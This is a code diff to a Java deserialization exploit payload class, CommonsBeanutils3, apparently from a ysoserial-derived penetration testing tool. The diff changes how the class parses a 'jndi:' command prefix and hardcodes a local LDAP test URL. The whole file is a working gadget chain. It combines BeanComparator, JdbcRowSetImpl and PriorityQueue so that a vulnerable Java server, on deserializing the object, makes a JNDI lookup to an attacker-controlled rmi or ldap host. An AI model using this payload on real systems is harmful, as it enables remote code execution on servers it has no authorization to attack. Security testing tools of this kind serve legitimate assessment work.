@@ -4,6 +4,7 @@ import com.sun.rowset.JdbcRowSetImpl;
 import me.gv7.woodpecker.yso.payloads.annotation.Authors;
 import me.gv7.woodpecker.yso.payloads.annotation.Dependencies;
 import me.gv7.woodpecker.yso.payloads.annotation.PayloadTest;
+import me.gv7.woodpecker.yso.payloads.custom.CustomCommand;
 import me.gv7.woodpecker.yso.payloads.util.PayloadRunner;
 import me.gv7.woodpecker.yso.payloads.util.Reflections;
 import org.apache.commons.beanutils.BeanComparator;
@@ -17,12 +18,16 @@ import java.util.PriorityQueue;
 public class CommonsBeanutils3 implements ObjectPayload<Object>{
     @Override
     public Object getObject(String command) throws Exception {
-        if (!command.startsWith("rmi:") && !command.startsWith("ldap://")) {
-            throw new IllegalArgumentException("Command format is: [rmi|ldap]://host:port/obj");
+        String jndiURL = null;
+        if(command.toLowerCase().startsWith(CustomCommand.COMMAND_JNDI)){
+            jndiURL = command.substring(CustomCommand.COMMAND_JNDI.length());
+        }else{
+            throw new Exception("Command format is: [rmi|ldap]://host:port/obj");
         }
+
         BeanComparator comparator = new BeanComparator("lowestSetBit");
         JdbcRowSetImpl rs = new JdbcRowSetImpl();
-        rs.setDataSourceName(command);
+        rs.setDataSourceName(jndiURL);
         rs.setMatchColumn("foo");
         PriorityQueue queue = new PriorityQueue(2, comparator);
 
@@ -35,7 +40,8 @@ public class CommonsBeanutils3 implements ObjectPayload<Object>{
         return  queue;
     }
 
-    public static void main ( final String[] args ) throws Exception {
+    public static void main ( String[] args ) throws Exception {
+        args = new String[]{"jndi:ldap://127.0.0.1:1664/obj"};
         PayloadRunner.run(CommonsBeanutils3.class, args);
     }
 }
